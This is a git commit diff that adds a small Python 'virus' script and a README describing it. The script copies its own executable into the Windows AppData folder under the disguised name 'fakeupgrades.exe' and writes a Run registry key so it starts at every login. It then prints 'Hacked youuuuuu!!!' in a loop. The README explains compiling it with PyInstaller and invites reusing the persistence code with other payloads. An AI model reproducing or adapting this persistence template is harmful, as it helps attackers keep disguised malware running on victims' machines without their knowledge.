164aa771cc38ed51f59ce59982e6b92882bf83e6
K4hveci <efeoyun26@gmail.com>
2024-08-13 19:41:42 +0300

    upload of main code

---
+++ Basic_virus.py
@@ -0,0 +1,29 @@
+# importing libs
+import time
+import subprocess as sp
+import os
+import shutil
+import sys
+
+
+def add_to_registery():
+    # presistence
+    # getting path of appdata
+    new_path = os.environ["appdata"] + "\\fakeupgrades.exe"
+    if not os.path.exists(new_path): # if there is no new path then create it
+        # regedit command to execute virus at start
+        regedit_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v fakeupgrade /t REG_SZ /d "{new_path}"' 
+
+        # executing regedit command and moving virus to new path at appdata
+        shutil.copyfile(sys.executable, new_path)
+        sp.call(regedit_command, shell=True)
+
+add_to_registery() # starting presistence
+
+# virus function part (printing haked you 100 times in 50 secs)
+
+x = 0
+while x < 100:
+    print("Hacked youuuuuu!!!")
+    x += 1
+    time.sleep(0.5)
--- README.md
+++ README.md
@@ -1,2 +1,10 @@
 # Basic Virus Elements
- Basic viirus elements to set virus execute at startup and moves virus to appdata directory
+ Basic virus elements to set virus execute at startup and moves virus to appdata directory
+
+# To make it executable use:
+```pyInstaller <file> --onefile```
+
+After that when you run the program, it will set itself as executable at startup and copys itself to appdata as ```fakeupgrade.exe```.
+You can change the virus part, for now it just writes "Hacked you" 100 times.
+You can use the presistence part for your other codes.
+I don't take any responsibility for the bad/harmful usage of the code.
